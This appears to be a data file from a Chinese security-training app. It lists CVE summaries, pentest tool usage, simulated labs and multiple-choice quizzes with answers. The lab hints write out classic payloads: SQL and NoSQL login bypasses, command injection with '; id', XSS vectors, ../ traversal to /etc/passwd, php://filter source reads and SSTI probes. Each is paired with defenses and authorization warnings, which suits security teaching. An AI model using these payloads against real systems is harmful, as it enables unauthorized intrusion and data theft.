    { id:"n_printnightmare", title:"PrintNightmare（CVE-2021-34527）", cve:"CVE-2021-34527", date:"2021-07", cat:"pentest",
      summary:"Windows 打印后台处理程序远程代码执行，低权限用户可提权至 SYSTEM。",
      defense:"禁用 Print Spooler 服务（非必需时）、限制驱动安装权限、及时补丁、网络分段。"},
    { id:"n_fortinet", title:"Fortinet SSL VPN 路径遍历（CVE-2018-13379）", cve:"CVE-2018-13379", date:"2019-06", cat:"pentest",
      summary:"FortiOS SSL VPN 路径遍历可读取会话文件，泄露用户名与明文口令等敏感信息。",
      defense:"升级 FortiOS、轮换所有 VPN 凭据、收敛 VPN 暴露面并启用 MFA。"},
    { id:"n_gitlab", title:"GitLab 反序列化 RCE（CVE-2021-22205）", cve:"CVE-2021-22205", date:"2021-04", cat:"web",
      summary:"GitLab 图片处理组件反序列化漏洞，未授权即可执行任意代码。",
      defense:"升级 GitLab 至安全版本、最小化暴露、启用 WAF 与入侵检测、定期漏洞扫描。"}
  ],

  /* ---------------- 安全工具（使用说明 + 合规提示） ---------------- */
  tools: [
    { id:"t_burp", name:"Burp Suite", cat:"web",
      desc:"Web 代理与漏洞测试平台，用于拦截/修改请求、扫描与重放。",
      usage:"配置浏览器代理 → 拦截请求 → Repeater 手工验证 → Intruder 做授权暴力/参数测试 → Scanner（Pro）辅助。",
      example:"Proxy 拦截登录包，修改 username 为 ' OR '1'='1 观察响应差异，确认注入点。",
      note:"仅用于你拥有授权的应用。不要开启「拦截并修改」他人流量。"},
    { id:"t_nmap", name:"Nmap", cat:"pentest",
      desc:"业界标准端口扫描与服务/版本/脚本探测工具。",
      usage:"nmap -sV -sC 做版本与默认脚本探测；-p- 全端口；--script 调 vuln 类脚本。",
      example:"nmap -sV -oA scan 10.10.10.10",
      note:"扫描前必须书面授权，避免在共享/生产网络造成拥塞或被误判为攻击。"},
    { id:"t_sqlmap", name:"sqlmap", cat:"web",
      desc:"自动化 SQL 注入检测与利用工具。",
      usage:"sqlmap -u URL --dbs 枚举库；--risk/--level 控制深度；--batch 非交互。",
      example:"sqlmap -u 'https://lab.example.com/item?id=1' --batch --dbs",
      note:"仅对授权靶场/自有目标使用。其流量特征明显，易被 WAF/IDS 记录。"},
    { id:"t_pwntools", name:"pwntools", cat:"binary",
      desc:"Python 编写的 CTF/pwn 利用框架，简化 exp 编写与交互。",
      usage:"from pwn import * 连接远程/本地、构造 payload、交互。",
      example:"io = remote('host', port); io.sendline(payload); io.interactive()",
      note:"用于本地靶机与 CTF 练习。禁止对未授权服务发起连接与利用。"},
    { id:"t_gdb", name:"GDB + pwndbg", cat:"binary",
      desc:"Linux 下调试二进制、分析崩溃与利用的标配。",
      usage:"gdb ./bin 加载，pwndbg 提供堆/栈可视化、cyclic、checksec。",
      example:"checksec ./pwn 查看保护；cyclic 定位溢出偏移。",
      note:"纯本地分析工具，合规风险低，但分析结果不要用于非授权利用。"},
    { id:"t_hashcat", name:"Hashcat / John", cat:"crypto",
      desc:"高性能口令恢复（哈希破解）工具，用于审计弱口令强度。",
      usage:"hashcat -m 0 -a 0 hashes.txt rockyou.txt 跑字典；弱口令暴露即修复。",
      example:"hashcat -m 1000 nt_hashes.txt -w 3 wordlist.txt",
      note:"仅用于你负责的系统/授权的口令审计。破解他人口令属违法。"},
    { id:"t_nuclei", name:"Nuclei", cat:"pentest",
      desc:"基于模板的快速漏洞扫描器，社区维护大量 CVE/配置模板。",
      usage:"nuclei -u target -t cves/ 跑已知漏洞模板；可自写模板。",
      example:"nuclei -l targets.txt -t exposures/ -o out.txt",
      note:"扫描动作须授权；扫描结果含敏感信息，妥善留存与销毁。"},
    { id:"t_wireshark", name:"Wireshark", cat:"pentest",
      desc:"网络协议分析器，用于排查流量异常与学习协议结构。",
      usage:"抓包 → 按协议过滤（http、tls、dns）→ 分析握手与明文泄露。",
      example:"过滤 tls.handshake 观察证书与握手过程。",
      note:"只抓你有权监控的接口/流量。抓他人通信违反隐私与法律。"},
    { id:"t_ghidra", name:"Ghidra", cat:"binary",
      desc:"NSA 开源的逆向工程/反汇编框架，带反编译与图形化分析。",
      usage:"导入二进制 → 自动分析 → 反编译为伪 C → 定位关键函数与字符串。",
      example:"在反编译器窗口搜索敏感字符串，交叉引用定位校验逻辑。",
      note:"用于本地二进制审计与 CTF 逆向。分析结果不要用于非授权利用。"},
    { id:"t_cyberchef", name:"CyberChef", cat:"crypto",
      desc:"「网络瑞士军刀」：浏览器内完成编码/解码、加解密、哈希、正则等数据操作。",
      usage:"左侧选操作（From Base64、AES Decrypt、MD5 等）拖入配方，实时看结果。",
      example:"From Base64 → 即可看到 JWT payload 明文；或 MD5(input) 验证弱口令。",
      note:"纯本地/在线数据处理工具，合规风险低；勿把敏感明文粘贴到不可信的在线实例。"},
    { id:"t_volatility", name:"Volatility", cat:"binary",
      desc:"内存取证分析框架，从内存镜像中提取进程、网络连接、恶意代码痕迹。",
      usage:"volatility -f mem.raw imageinfo 识别Profile → pslist/malfind/netscan 分析。",
      example:"volatility -f dump.raw --profile=Win10x64 pslist 列出进程找异常。",
      note:"用于授权事件响应与取证练习。内存镜像须来自你有权分析的机器。"},
    { id:"t_metasploit", name:"Metasploit Framework", cat:"pentest",
      desc:"漏洞利用与后渗透框架，模块化 payload 与 exploit 管理。",
      usage:"msfconsole → search <cve> → use exploit → set RHOST → run；或生成载荷。",
      example:"msf6 > use exploit/multi/handler 监听反弹 shell（仅授权环境）。",
      note:"只对你拥有书面授权的目标使用。其流量与载荷特征明显，极易触发告警与法律问题。"}
  ],

  /* ---------------- 在线演练（程序内可交互靶场，纯前端模拟） ---------------- */
  labs: [
    {
      id:"lab_sqli", type:"sqli", cat:"web", level:"初级", title:"SQL 注入：登录绕过",
      brief:"这是一个模拟的登录接口，后端用字符串拼接构造 SQL：\nSELECT * FROM users WHERE username='<输入>' AND password='<输入>'\n试着构造 payload 让 WHERE 条件恒为真，从而以 admin 身份登录。",
      task:"在下方填写用户名与密码，点「提交查询」观察构造出的 SQL 与登录结果。",
      hints:["经典绕过：用户名填 admin' -- 让密码校验被注释掉","或用户名填 ' OR '1'='1' -- 让条件恒真","注意单引号要成对，否则语句语法错误"]
    },
    {
      id:"lab_cmdi", type:"cmdi", cat:"web", level:"初级", title:"命令注入：拼接 ping",
      brief:"某网站把你输入的主机名直接拼进 shell 命令：\nping -c1 <输入>\n试着用分隔符执行额外命令（如 id / whoami）。",
      task:"输入主机名（如 127.0.0.1），并尝试用 ; 或 && 追加命令。",
      hints:["用 127.0.0.1; id 或 127.0.0.1 && whoami","分隔符让 shell 把后半段当作新命令执行","防御：用参数数组而非 shell 拼接，或对输入严格转义"]
    },
    {
      id:"lab_xss", type:"xss", cat:"web", level:"初级", title:"反射型 XSS：搜索回显",
      brief:"搜索框会把你的输入原样回显到页面。如果输入脚本会怎样？\n下方在隔离沙箱里预览效果（sandbox 隔离，不会影响本应用）。",
      task:"输入一段能触发脚本的 payload，例如 <script>alert(1)</script> 或 <svg onload=alert(1)>。",
      hints:["<script>alert(1)</script> 是最直接的","事件处理器写法：<img src=x onerror=alert(1)>","防御：输出编码 + 内容安全策略 CSP"]
    },
    {
      id:"lab_b64", type:"decode", cat:"crypto", level:"入门", title:"密码学：Base64 解码",
      brief:"下面是一段 Base64 编码的字符串，请解码出原始内容（即 flag）。",
      task:"把解码结果填到输入框并提交。",
      ciphertext:"U2VjVHV0b3J7YmFzZTY0X2RlY29kZX0=",
      answer:"SecTutor{base64_decode}",
      hints:["这是标准 Base64","可用浏览器控制台 atob() 或任意解码工具（仅本地练习）","解码后是 SecTutor{...} 形式"]
    },
    {
      id:"lab_caesar", type:"decode", cat:"crypto", level:"入门", title:"密码学：凯撒密码",
      brief:"一段凯撒密码（每个字母向后移 3 位）的密文，请还原明文。",
      task:"输入明文（含空格与标点）。",
      ciphertext:"Khoor, Vhfuhw sduwb!",
      answer:"Hello, Secret party!",
      hints:["每个字母向后移了 3 位：A->D, B->E ...","反向把每个字母往前移 3 位即可","解码后是一句问候语"]
    },
    {
      id:"lab_quiz", type:"quiz", cat:"binary", level:"入门", title:"找漏洞：栈溢出",
      brief:"读下面这段 C 代码，找出会导致缓冲区溢出的一行。",
      code:"void vuln(char *s){\n  char buf[16];\n  strcpy(buf, s);   // 危险\n  printf(buf);\n}",
      question:"哪一行会导致缓冲区溢出？",
      options:["char buf[16];  // 声明 16 字节栈缓冲区","strcpy(buf, s);  // 不检查长度地拷贝","printf(buf);  // 直接打印"],
      answer:1,
      hints:["strcpy 不检查目标缓冲区大小","buf 只有 16 字节，而 s 可能远大于此","正确写法：strncpy + 边界检查，或改用安全函数"]
    },
    {
      id:"lab_traversal", type:"traversal", cat:"web", level:"初级", title:"路径遍历：读取敏感文件",
      brief:"某下载接口把文件名直接拼进路径：\nreadFile('/var/www/files/' + filename)\n试着用 ../ 跳出目录，读到系统敏感文件（如 /etc/passwd）。",
      task:"输入要读取的文件名，点「读取」观察实际拼接出的路径。",
      hints:["用 ../../../../etc/passwd 逐级跳出基目录","Windows 下 ..\\ 亦可","防御：白名单文件名、限制基目录、规范化后校验前缀"]
    },
    {
      id:"lab_nosql", type:"nosql", cat:"web", level:"初级", title:"NoSQL 注入：登录绕过",
      brief:"一个 MongoDB 登录接口用对象而非字符串做查询：\ndb.users.find({ username: <输入>, password: <输入> })\n试试让 username 条件恒真，绕过密码校验以 admin 登录。",
      task:"填写用户名（可填 JSON/表达式），点「登录」观察构造出的查询与结果。",
      hints:["用 { \"$ne\": \"\" } 让条件「不等于空」恒匹配","或用户名填 ' || '1'=='1 这类恒真","防御：用严格类型，拒绝用户传入对象或 $ 运算符"]
    },
    {
      id:"lab_jwt", type:"decode", cat:"web", level:"中级", title:"JWT 解码：读 payload",
      brief:"下面是一段 JWT（三段用点分隔）。请解码出它的 payload（第二段，Base64URL）明文，这就是 flag。",
      task:"把解码出的 payload 明文填到输入框提交（如 {\"role\":\"admin\"}）。",
      ciphertext:"eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.abcdefghijklmnopqrstuvwxyz",
      answer:"{\"role\":\"admin\"}",
      hints:["JWT 第二段是 Base64URL 编码的 JSON","解码后是 {\"role\":\"admin\"}","防御：固定算法白名单 + 强密钥，勿让 alg 由客户端控制"]
    },
    {
      id:"lab_weakpass", type:"decode", cat:"crypto", level:"入门", title:"密码学：弱口令 MD5 还原",
      brief:"下面是一个 MD5 哈希（32 位十六进制）。它来自一个常见弱口令。请还原出原口令（小写字母数字）。",
      task:"把原口令明文填到输入框提交。",
      ciphertext:"e10adc3949ba59abbe56e057f20f883e",
      answer:"123456",
      hints:["这是最常见的弱口令之一（6 位数字）","MD5 不可用于口令存储；用哈希猫可直接爆破","防御：bcrypt/argon2 + 加盐"]
    },
    {
      id:"lab_csp", type:"quiz", cat:"web", level:"初级", title:"找漏洞：CSP 配置",
      brief:"读下面这段 HTTP 响应头，判断它能否有效阻止内联脚本执行。\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'",
      code:"Content-Security-Policy: default-src 'self';\nscript-src 'self' 'unsafe-inline'",
      question:"这段 CSP 能阻止 XSS 执行内联脚本吗？",
      options:["能，'self' 已经足够安全","不能，'unsafe-inline' 明确允许内联脚本执行","取决于浏览器版本"],
      answer:1,
      hints:["'unsafe-inline' 会放行 <script> 与 on* 事件处理器","正确做法：去掉 unsafe-inline 并配合随机数/哈希 nonce","CSP 是纵深防御，不能替代输出编码"]
    },
    {
      id:"lab_ssti", type:"ssti", cat:"web", level:"中级", topic:"ssti", title:"服务端模板注入（SSTI）",
      brief:"某站把用户输入直接拼进模板字符串再渲染：\nrender_template_string(\"Hello \" + user_input)\n试着构造模板表达式，看服务端是否把它当作代码执行——这就是 SSTI 漏洞。",
      task:"在下方输入一段模板表达式，点「渲染」观察服务端把你的输入当作模板执行的结果。",
      example:"{{7*7}}",
      hints:["最经典的探测：{{7*7}} 若返回 49 说明表达式被执行","Jinja2 下可试 {{config}} / {{7*'7'}} 读取对象或自乘","防御：永远不要把用户输入拼进模板源码，用固定模板 + 变量传参"]
    },
    {
      id:"lab_idor", type:"idor", cat:"web", level:"初级", topic:"idor", title:"越权访问（IDOR）",
      brief:"某接口根据 URL 里的 id 返回用户资料：\nGET /api/user/<id>/profile\n你登录后的身份是 id=1001。试着篡改 id 去读取别人的资料，理解「客户端可改参数」带来的越权风险。",
      task:"在下方输入你想访问的 id（默认你自己的 1001），点「请求资料」观察服务端是否返回了别人的数据。",
      example:"1002",
      hints:["把 id 改成 1002、1003 等别人的编号即可越权读取","或改成 admin / 1000 这类高权限账户","防御：服务端必须按当前登录用户校验资源归属，绝不能信任客户端传入的 id"]
    },
    {
      id:"lab_lfi", type:"lfi", cat:"web", level:"初级", topic:"lfi", title:"文件包含与本地文件读取（LFI）",
      brief:"某页面用参数决定包含哪个文件：\ninclude($_GET['page'])\n试着用 ../ 跳出 Web 目录，或利用 PHP 包装器读取源码，暴露本地文件包含漏洞。",
      task:"在下方输入 page 参数值，点「包含文件」观察实际被包含的路径或内容。",
      example:"../../../../etc/passwd",
      hints:["用 ../../../../etc/passwd 逐级跳出 Web 根目录","PHP 下可试 php://filter/convert.base64-encode/resource=config 读源码","防御：白名单文件名、禁用 PHP 包装器、关闭 allow_url_include"]
    },
    {
      id:"lab_hex", type:"decode", cat:"crypto", level:"入门", title:"密码学：十六进制解码",
      brief:"下面是一段十六进制编码的字符串（每两个字符表示一个字节），请解码出原始文本（即 flag）。",
      task:"把解码结果填到输入框并提交。",
      ciphertext:"5365635475746f727b6865785f6465636f64657d",
      answer:"SecTutor{hex_decode}",
      hints:["这是十六进制：53=S, 65=e, 63=c …","每两位一组转成对应 ASCII 字符即可","解码后是 SecTutor{...} 形式"]
    }
  ],
  /* ---------------- 随机自测题库（跨四领域 MCQ） ---------------- */
  quizzes: [
    { id:"q_sqli", cat:"web", level:"初级", q:"以下哪项最能从根本上防止 SQL 注入？",
      options:["对用户输入做字符串转义","使用参数化查询/预编译语句（占位符）","限制输入长度","把数据库放在内网"], answer:1,
      explain:"转义只是缓解且易漏；参数化查询让数据与指令分离，从根源阻断注入。" },
    { id:"q_xss", cat:"web", level:"初级", q:"防止存储型 XSS 的关键措施是？",
      options:["禁用 JavaScript","对输出做 HTML 编码 + 设置 CSP","只在公司内网访问","强制使用 HTTPS"], answer:1,
      explain:"核心是输出编码（按上下文转义）+ CSP 纵深防御；HTTPS 不解决 XSS。" },
    { id:"q_csrf", cat:"web", level:"中级", q:"防御 CSRF 攻击最有效的是？",
      options:["加图形验证码","使用 Anti-CSRF Token + SameSite Cookie","加密传输内容","限制来源 IP"], answer:1,
      explain:"Token 保证请求出自本人页面；SameSite=Strict/Lax 能挡跨站携带 Cookie。" },
    { id:"q_xxe", cat:"web", level:"中级", q:"XXE（XML 外部实体注入）的主要根因是？",
      options:["JSON 解析不当","XML 解析器启用了外部实体（ENTITY）解析","SQL 语句拼接","不安全的反序列化"], answer:1,
      explain:"禁掉 DOCTYPE/外部实体解析，或使用不解析 DTD 的安全解析器即可缓解。" },
    { id:"q_jwt", cat:"web", level:"中级", q:"某 JWT 库在验证时若攻击者把 alg 改成 none，可能？",
      options:["签名失效但无影响","绕过签名校验、伪造任意 payload","密钥直接泄露","会话立即过期"], answer:1,
      explain:"算法由客户端控制是致命缺陷；应固定服务端算法白名单并校验签名。" },
    { id:"q_stack", cat:"binary", level:"初级", q:"栈溢出漏洞利用的关键目标是覆盖？",
      options:["局部变量的值","函数的返回地址","全局变量","堆的元数据"], answer:1,
      explain:"覆盖返回地址可劫持控制流；配合 shellcode/ROP 实现代码执行。" },
    { id:"q_fmt", cat:"binary", level:"初级", q:"格式化字符串漏洞中，%n 能造成什么危害？",
      options:["读取栈上数据","向指定内存地址写入数据（可改返回地址/GS Cookie）","直接弹出命令行","拒绝服务攻击"], answer:1,
      explain:"%n 写入、%x/%s 读取；禁止用户控制格式串即可消除该漏洞。" },
    { id:"q_race", cat:"binary", level:"中级", q:"条件竞争（Race Condition）类漏洞常源于？",
      options:["口令强度过低","检查与使用之间的时序窗口（TOCTOU）","SQL 注入","跨站脚本"], answer:1,
      explain:"如先鉴权再操作，中间被并发请求插空；需用锁/原子操作/事务化。" },
    { id:"q_ecb", cat:"crypto", level:"初级", q:"哪种分组密码模式会暴露明文结构（相同明文块→相同密文块）？",
      options:["CBC","ECB","GCM","CTR"], answer:1,
      explain:"ECB 无随机化；应使用带 IV 的 CBC/GCM 等，并优先选 AEAD（GCM）。" },
    { id:"q_rng", cat:"crypto", level:"中级", q:"生成会话令牌应使用？",
      options:["rand() 取模","密码学安全随机数（CSPRNG，如 /dev/urandom）","以当前时间作种子","进程 ID"], answer:1,
      explain:"rand()/时间/pid 可预测；令牌必须来自 CSPRNG 且足够长。" },
    { id:"q_hash", cat:"crypto", level:"入门", q:"存储用户口令的正确做法是？",
      options:["明文存储","MD5 单次哈希","bcrypt/argon2 + 加盐","Base64 编码"], answer:2,
      explain:"慢哈希 + 每用户盐才能抗暴力/彩虹表；MD5/SHA 过快且无盐。" },
    { id:"q_oauth", cat:"pentest", level:"中级", q:"OAuth 授权码流程中，若 redirect_uri 未严格校验，攻击者可？",
      options:["直接提升权限","把授权码泄露到自己控制的回调地址进而兑换令牌","破解用户密码","绕过 MFA"], answer:1,
      explain:"应精确匹配白名单；同时校验 state 防 CSRF、用 PKCE 防授权码拦截。" },
    { id:"q_ssti", cat:"web", level:"中级", q:"把用户输入直接拼进模板字符串再渲染（如 render_template_string(user)），最可能导致？",
      options:["SQL 注入","服务端模板注入（SSTI），可执行表达式/读对象","跨站脚本","拒绝服务"], answer:1,
      explain:"用户输入被当作模板源码解析执行；应使用固定模板 + 参数传参，绝不拼接用户输入进模板。" },
    { id:"q_idor", cat:"web", level:"初级", q:"防御 IDOR（越权访问）的核心做法是？",
      options:["在前端隐藏 id 参数","服务端按当前登录用户校验资源归属，不信任客户端传入的 id","把 id 改成 UUID","限制请求频率"], answer:1,
      explain:"隐藏/改 UUID 只是增加难度；真正防线是服务端做归属校验（如 owner == current_user）。" },
    { id:"q_lfi", cat:"web", level:"初级", q:"缓解本地文件包含（LFI）最有效的做法是？",
      options:["过滤掉 ../ 字符串","文件名白名单 + 禁止 PHP 包装器/远程包含","把文件放到 Web 根目录","记录访问日志"], answer:1,
      explain:"字符串过滤易被变形绕过；白名单 + 关闭 allow_url_include 才是根本。" },
    { id:"q_blockmode", cat:"crypto", level:"初级", q:"以下哪种分组模式同时提供机密性与完整性（AEAD 认证加密）？",
      options:["ECB","CBC","GCM","CTR（无 MAC）"], answer:2,
      explain:"GCM 是 AEAD，内建完整性校验；ECB/CBC/CTR 仅提供机密性，需额外 MAC。" },
    { id:"q_osint", cat:"pentest", level:"入门", q:"下列属于「被动」开源情报（OSINT）收集的是？",
      options:["直接扫描目标端口","用 crt.sh 查询证书透明日志枚举子域名","对目标发起漏洞扫描","爆破后台登录"], answer:1,
      explain:"被动收集不接触目标（证书透明、whois、搜索缓存），降低被发现与封禁风险。" },

  // ===================== 扩充题库（庞大且多元）：Web / 二进制 / 密码学 / 渗透 =====================
  // ---- Web 安全 · 入门 ----
  { id:"xw1", cat:"web", level:"入门", q:"以下哪种做法最可能引入 SQL 注入？", options:["使用参数化查询","将用户输入直接拼接进 SQL 字符串","对输入做白名单校验","使用存储过程且参数绑定"], answer:1, explain:"拼接不可信输入到查询字符串是 SQL 注入的根因；参数化查询可从根本上阻断。" },
  { id:"xw2", cat:"web", level:"入门", q:"SQL 注入中，UNION 注入的主要目的是？", options:["删除数据库","把额外查询结果拼接到原结果集中回显","提升数据库权限","绕过登录"], answer:1, explain:"UNION SELECT 让攻击者把自定义查询的结果并入原页面响应，常用于拖库。" },
  { id:"xw3", cat:"web", level:"入门", q:"“盲注”（Blind SQLi）与常规注入的区别是？", options:["盲注无法利用","响应不直接回显数据，需靠布尔/时间差异推断","盲注只发生在 NoSQL","盲注不需要构造 payload"], answer:1, explain:"盲注时页面不返回数据本身，攻击者通过真假条件或睡眠延时来“问”数据库。" },
  { id:"xw4", cat:"web", level:"入门", q:"反射型 XSS 的传播方式是？", options:["存储在服务器数据库","通过链接/参数把恶意脚本“反射”到响应中诱用户点击","写入 cookie","仅在本地文件"], answer:1, explain:"反射型依赖把恶意脚本放进请求（如 URL），服务器原样返回到受害者浏览器执行。" },
  { id:"xw5", cat:"web", level:"入门", q:"存储型 XSS 与反射型 XSS 的主要区别？", options:["存储型把恶意脚本存到服务端，用户访问即触发","反射型更危险","存储型不执行","两者完全一样"], answer:0, explain:"存储型payload进入数据库/页面，任何访客都会被触发，影响面更大。" },
  { id:"xw6", cat:"web", level:"入门", q:"DOM 型 XSS 的源头通常在？", options:["服务端模板拼接","客户端 JS 读取不可信来源(location.hash/document.URL)并写入 DOM","数据库存储","HTTP 头"], answer:1, explain:"DOM XSS 完全发生在客户端，服务端未输出恶意脚本，而是由前端 JS 不安全地操作 DOM 造成。" },
  { id:"xw7", cat:"web", level:"入门", q:"为降低 XSS 影响，敏感 cookie 应设置？", options:["HttpOnly","仅 Secure 即可","SameSite=None","Path=/"], answer:0, explain:"HttpOnly 禁止 JS 读取该 cookie，可阻止 XSS 偷会话。" },
  { id:"xw8", cat:"web", level:"入门", q:"CSP（内容安全策略）主要用于？", options:["加速页面","限制可加载/执行的资源来源，缓解 XSS 与数据注入","加密传输","防 CSRF"], answer:1, explain:"CSP 通过白名单约束脚本/资源来源，是重要的 XSS 纵深防御手段。" },
  { id:"xw9", cat:"web", level:"入门", q:"CSRF 攻击成功依赖浏览器的哪项行为？", options:["自动执行 JS","自动携带目标站 cookie 发起跨站请求","同源策略","CORS 预检"], answer:1, explain:"浏览器会自动附带目标站 cookie，使受害者在不知情时以自己身份发请求。" },
  { id:"xw10", cat:"web", level:"入门", q:"防御 CSRF 最有效组合是？", options:["图形验证码 + 短信","Anti-CSRF Token + SameSite Cookie","禁用 JS","更换 IP"], answer:1, explain:"Token 保证请求出自本人页面，SameSite 限制跨站携带 cookie，二者叠加更稳。" },
  { id:"xw11", cat:"web", level:"入门", q:"SameSite=Strict 对 Cookie 的影响是？", options:["任何请求都带","跨站请求不携带该 Cookie","仅 HTTPS 带","永不失效"], answer:1, explain:"Strict 最严格：只要请求发起方与目标站不同站，就不带该 cookie。" },
  { id:"xw12", cat:"web", level:"入门", q:"XXE 漏洞根因是？", options:["JSON 解析","XML 解析器允许解析外部实体(DTD/ENTITY)","HTML 编码","SQL 拼接"], answer:1, explain:"启用外部实体解析后，攻击者可读取文件或发起 SSRF。" },
  { id:"xw13", cat:"web", level:"入门", q:"XXE 常被用来做 SSRF，典型是？", options:["读取本地文件 file:// 或访问内网","修改 DNS","提升权限","删除日志"], answer:0, explain:"外部实体可指向 file:// 或内网地址，从而读文件或访问内部服务。" },
  { id:"xw14", cat:"web", level:"入门", q:"SSRF（服务端请求伪造）的防御核心是？", options:["禁用 HTTPS","对目标地址做白名单/禁止访问内网与云元数据","增大超时","启用 gzip"], answer:1, explain:"SSRF 是服务器代发请求，必须约束目标地址，禁止内网与云元数据地址。" },
  { id:"xw15", cat:"web", level:"入门", q:"云环境 SSRF 常试图访问哪个地址读取实例元数据/临时凭证？", options:["8.8.8.8","169.254.169.254","127.0.0.1:80","example.com"], answer:1, explain:"169.254.169.254 是云实例的链路本地元数据服务，常含临时凭证，是 SSRF 的高价值目标。" },
  { id:"xw16", cat:"web", level:"入门", q:"文件上传漏洞防御不包括？", options:["校验文件类型与内容","限制执行权限(存到非可执行目录)","信任客户端文件名","重命名随机化"], answer:2, explain:"客户端文件名完全可控，绝不能信任；应服务端校验类型/内容并随机命名。" },
  { id:"xw17", cat:"web", level:"入门", q:"路径遍历(../)利用目的是？", options:["提升网速","跳出 Web 根目录读取/执行任意文件","注入 SQL","绕过 CSP"], answer:1, explain:"../ 序列可回溯目录，读取或包含本不应暴露的文件。" },
  { id:"xw18", cat:"web", level:"入门", q:"开放重定向(open redirect)常用于？", options:["提权","钓鱼跳转窃取凭证/令牌","SQL 注入","XSS"], answer:1, explain:"开放重定向常被放进钓鱼链接，诱使用户以为在访问可信站点。" },
  { id:"xw19", cat:"web", level:"入门", q:"点击劫持(clickjacking)防御用？", options:["X-Frame-Options / CSP frame-ancestors 禁止被 iframe 嵌套","CORS","HttpOnly","HSTS"], answer:0, explain:"阻止站点被嵌入恶意 iframe，可防用户误点隐藏按钮。" },
  { id:"xw20", cat:"web", level:"入门", q:"HSTS 的作用是？", options:["强制 HTTPS、防 SSL 剥离/降级","防 XSS","防 CSRF","加密 cookie"], answer:0, explain:"HSTS 让浏览器只走 HTTPS，缓解降级与 SSL stripping。" },
  // ---- Web 安全 · 初级 ----
  { id:"xw21", cat:"web", level:"初级", q:"命令注入(OS command injection)防御应优先？", options:["转义所有字符","避免调用 shell、用参数数组/白名单","加长超时","禁用网络"], answer:1, explain:"最佳是根本不拼 shell；必须调用时用参数数组且白名单校验。" },
  { id:"xw22", cat:"web", level:"初级", q:"NoSQL 注入(如 MongoDB)常利用？", options:["union","操作符如 $ne/$gt 改变查询逻辑(绕过认证)","order by","limit"], answer:1, explain:"把输入变成查询操作符对象，可构造恒真条件绕过登录等逻辑。" },
  { id:"xw23", cat:"web", level:"初级", q:"二阶(Second-Order)注入指？", options:["两次扫描","恶意数据先被存储、后续在另一处被拼入命令/查询执行","二级缓存","两阶段认证"], answer:1, explain:"数据先“安全”入库，之后在另一处被取出拼入上下文才触发，易被忽略。" },
  { id:"xw24", cat:"web", level:"初级", q:"报错注入利用？", options:["数据库报错信息回显数据","cookie","HTTP 头","CSS"], answer:0, explain:"利用数据库报错把内部数据带回页面，是信息回显型注入。" },
  { id:"xw25", cat:"web", level:"初级", q:"功能级越权(BFLA)例子？", options:["改 URL 里的 id","修改 role/admin 参数调用本无权用的管理接口","改密码","改邮箱"], answer:1, explain:"BFLA 是横向/纵向的功能越权，如普通用户改参数调用管理员接口。" },
  { id:"xw26", cat:"web", level:"初级", q:"会话固定(session fixation)指？", options:["会话随机生成","攻击者先种入已知 session id 诱用户使用，从而冒充","会话加密","会话过期"], answer:1, explain:"攻击者预先设定会话标识并诱使受害者使用，登录后攻击者即可凭该 id 冒充。" },
  { id:"xw27", cat:"web", level:"初级", q:"Cookie 的 Secure 属性表示？", options:["仅 HTTPS 传输","仅同源","不可读","永不过期"], answer:0, explain:"Secure 要求 cookie 只能通过 HTTPS 发送，降低明文泄露风险。" },
  { id:"xw28", cat:"web", level:"初级", q:"Cookie 的 SameSite 属性用于？", options:["控制跨站请求是否携带","加密","压缩","存储大小"], answer:0, explain:"SameSite 决定跨站请求是否附带该 cookie，是防御 CSRF 的重要手段。" },
  { id:"xw29", cat:"web", level:"初级", q:"JWT 弱密钥/共享密钥可被？", options:["压缩","离线爆破(字典)伪造令牌","DNS 污染","CSRF"], answer:1, explain:"HS256 用对称密钥，若密钥弱可被字典爆破，从而伪造任意身份令牌。" },
  { id:"xw30", cat:"web", level:"初级", q:"JWT 的 kid 参数若未校验可被用于？", options:["路径遍历/SQL 注入来定位签名密钥","加速","压缩","加密"], answer:0, explain:"kid 指向密钥文件/数据库，未校验时可借路径遍历或注入篡改验签所用的密钥。" },
  { id:"xw31", cat:"web", level:"初级", q:"CORS 设置 Access-Control-Allow-Origin: * 且带凭据时？", options:["允许任意源带凭据","浏览器不允许 * 与凭据同时使用，需显式源","提升性能","防 XSS"], answer:1, explain:"带凭据时不能用通配符，必须返回具体的请求源，否则浏览器拒绝。" },
  { id:"xw32", cat:"web", level:"初级", q:"反射 Origin 到 CORS 头(任意源)会导致？", options:["性能提升","跨源读取本应受限的资源(信息泄露)","防 CSRF","加密"], answer:1, explain:"把请求者 Origin 原样回显等于对任意源开放，敏感接口会被跨站读取。" },
  { id:"xw33", cat:"web", level:"初级", q:"子资源完整性(SRI)用途？", options:["校验第三方资源哈希防被篡改","加速","压缩","加密 cookie"], answer:0, explain:"SRI 用哈希校验 CDN 脚本/样式是否被替换，防止供应链投毒。" },
  { id:"xw34", cat:"web", level:"初级", q:"同源策略(SOP)主要限制？", options:["跨源读取资源","同站脚本","本地存储","cookie 大小"], answer:0, explain:"SOP 限制网页跨源读取响应，CORS 是在其之上的受控放宽。" },
  { id:"xw35", cat:"web", level:"初级", q:"GraphQL 常见风险包括？", options:["内省暴露 schema、深度/批查询导致 DoS","SQL 注入","XSS","CSRF"], answer:0, explain:"默认内省暴露全量 schema，且嵌套/批量查询可被用于资源耗尽型 DoS。" },
  { id:"xw36", cat:"web", level:"初级", q:"RFI(远程文件包含)与 LFI 区别？", options:["RFI 可加载远程攻击者控制的文件并执行","LFI 只读取","RFI 更安全","无区别"], answer:0, explain:"RFI 把远程恶意文件包含进来执行，危害更大；LFI 通常只能读本地文件。" },
  // ---- Web 安全 · 中级 ----
  { id:"xw37", cat:"web", level:"中级", q:"HTTP 请求走私(CL/TE)利用？", options:["前后端对 Content-Length/Transfer-Encoding 解析不一致造成请求拼接","DNS","CSRF","XSS"], answer:0, explain:"前后端解析差异可把两个请求“粘”在一起，绕过安全控制或污染他人请求。" },
  { id:"xw38", cat:"web", level:"中级", q:"HTTP 响应拆分(CRLF 注入)可造成？", options:["缓存投毒/头注入/ XSS","提速","压缩","加密"], answer:0, explain:"注入 CRLF 可在响应中插入额外头或拆分响应，进而 XSS/缓存投毒。" },
  { id:"xw39", cat:"web", level:"中级", q:"主机头注入(Host header)常用于？", options:["密码重置链接中毒/缓存投毒","XSS","CSRF","SQLi"], answer:0, explain:"服务端若用 Host 头拼重置链接，攻击者可令受害者收到指向恶意域的链接。" },
